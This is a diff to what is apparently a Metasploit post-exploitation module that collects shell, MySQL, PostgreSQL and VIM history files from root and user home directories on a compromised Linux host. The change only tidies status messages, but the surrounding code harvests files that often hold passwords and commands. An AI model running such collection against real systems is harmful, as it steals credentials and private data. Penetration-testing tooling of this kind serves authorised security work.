@@ -89,11 +89,10 @@ class Metasploit3 < Msf::Post
     if user == 'root' && !users.nil?
       users = users.chomp.split
       users.each do |u|
+        vprint_status("Extracting #{shell} history for #{u}")
         if u == 'root'
-          vprint_status("Extracting #{shell} history for #{u}")
           hist = cat_file("/root/.#{shell}_history")
         else
-          vprint_status("Extracting #{shell} history for #{u}")
           hist = cat_file("/home/#{u}/.#{shell}_history")
         end
         save("#{shell} History for #{u}", hist) unless hist.blank? || hist =~ /No such file or directory/
@@ -110,11 +109,10 @@ class Metasploit3 < Msf::Post
     if user == 'root' && !users.nil?
       users = users.chomp.split
       users.each do |u|
+        vprint_status("Extracting MySQL history for #{u}")
         if u == 'root'
-          vprint_status("Extracting MySQL history for #{u}")
           sql_hist = cat_file('/root/.mysql_history')
         else
-          vprint_status("Extracting MySQL history for #{u}")
           sql_hist = cat_file("/home/#{u}/.mysql_history")
         end
         save("MySQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
@@ -131,11 +129,10 @@ class Metasploit3 < Msf::Post
     if user == 'root' && !users.nil?
       users = users.chomp.split
       users.each do |u|
+        vprint_status("Extracting PostgreSQL history for #{u}")
         if u == 'root'
-          vprint_status("Extracting PostgreSQL history for #{u}")
           sql_hist = cat_file('/root/.psql_history')
         else
-          vprint_status("Extracting PostgreSQL history for #{u}")
           sql_hist = cat_file("/home/#{u}/.psql_history")
         end
         save("PostgreSQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
@@ -152,17 +149,16 @@ class Metasploit3 < Msf::Post
     if user == 'root' && !users.nil?
       users = users.chomp.split
       users.each do |u|
+        vprint_status("Extracting VIM history for #{u}")
         if u == 'root'
-          vprint_status("Extracting VIM history for #{u}")
           vim_hist = cat_file('/root/.viminfo')
         else
-          vprint_status("Extracting VIM history for #{u}")
           vim_hist = cat_file("/home/#{u}/.viminfo")
         end
         save("VIM History for #{u}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
       end
     else
-      vprint_status("Extracting history for #{user}")
+      vprint_status("Extracting VIM history for #{user}")
       vim_hist = cat_file("/home/#{user}/.viminfo")
       vprint_status(vim_hist)
       save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
